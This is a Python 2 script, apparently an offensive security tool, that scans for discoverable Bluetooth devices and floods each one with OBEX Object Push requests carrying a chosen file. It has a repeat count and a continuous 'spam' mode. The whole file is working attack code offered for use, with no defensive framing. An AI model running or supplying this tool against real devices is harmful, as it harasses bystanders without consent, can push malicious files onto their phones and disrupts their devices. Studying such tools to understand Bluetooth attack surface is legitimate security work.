#
# Bluetooth scanner with ability to spam devices
# with incoming OBEX Object Push requests containing
# specified file.
#
# Mariusz Banach / MGeeky, 16'
#
# Partially based on `Violent Python` snippets.
# Modules required:
#   python-bluez
#   python-obexftp
#
import bluetooth
import scapy
import obexftp
import sys
import optparse
import threading
import time
import os

foundDevs = []

def printDev(name, dev, txt='Bluetooth device'):
    print '[+] %s: "%s" (MAC: %s)' % (txt, name, dev)

def retBtAddr(addr):
    btAddr = str(hex(int(addr.replace(':', ''), 16) + 1))[2:]
    btAddr = btAddr[0:2] + ':' + btAddr[2:4] + ':' + btAddr[4:6] + \
            ':' + btAddr[6:8] + ':' + btAddr[8:10] + ':' + btAddr[10:12]
    return btAddr

def checkBluetooth(btAddr):
    btName = bluetooth.lookup_name(btAddr)
    if btName:
        printDev('Hidden Bluetooth device detected', btName, btAddr)
        return True

    return False

def sendFile(dev, filename):
    if os.path.exists(filename):
        client = obexftp.client(obexftp.BLUETOOTH)
        channel = obexftp.browsebt(dev, obexftp.PUSH)
        print '[>] Sending file to %s@%s' % (dev, str(channel))
        client.connect(dev, channel)
        ret = client.put_file(filename)
        if int(ret) >= 1:
            print '[>] File has been sent.'
        else:
            print '[!] File has not been accepted.'
        client.disconnect()
    else:
        print '[!] Specified file: "%s" does not exists.'

def findDevs(opts):
    global foundDevs
    devList = bluetooth.discover_devices(lookup_names=True)
    repeat = range(0, int(opts.repeat))

    for (dev, name) in devList:
        if dev not in foundDevs:
            name = str(bluetooth.lookup_name(dev))
            printDev(name, dev)
            foundDevs.append(dev)
            for i in repeat:
                sendFile(dev, opts.file)
            continue

        if opts.spam:
            for i in repeat:
                sendFile(dev, opts.file)

def main():
    parser = optparse.OptionParser(usage='Usage: %prog [options]')
    parser.add_option('-f', '--file', dest='file', metavar='FILE', help='Specifies file to be sent to discovered devices.')
    parser.add_option('-t', '--time', dest='time', metavar='TIMEOUT', help='Specifies scanning timeout (default - 0 secs).', default='0')
    parser.add_option('-r', '--repeat', dest='repeat', metavar='REPEAT', help='Number of times to repeat file sending after finding a device (default - 1)', default='1')
    parser.add_option('-s', '--spam', dest='spam', action='store_true', help='Spam found devices with the file continuosly')

    print '\nBluetooth file carpet bombing via OBEX Object Push'
    print 'Mariusz Banach / MGeeky 16\n'

    (opts, args) = parser.parse_args()

    if opts.file != '':
        if not os.path.exists(opts.file):
            print '[!] Specified file: "%s" does not exists.'
            sys.exit(0)

    print '[+] Started Bluetooth scanning. Ctr-C to stop...'

    timeout = float(opts.time)
    try:
        while True:
            findDevs(opts)
            time.sleep(timeout)
    except KeyboardInterrupt, e:
        print '\n[?] User interruption.'

if __name__ == '__main__':
    main()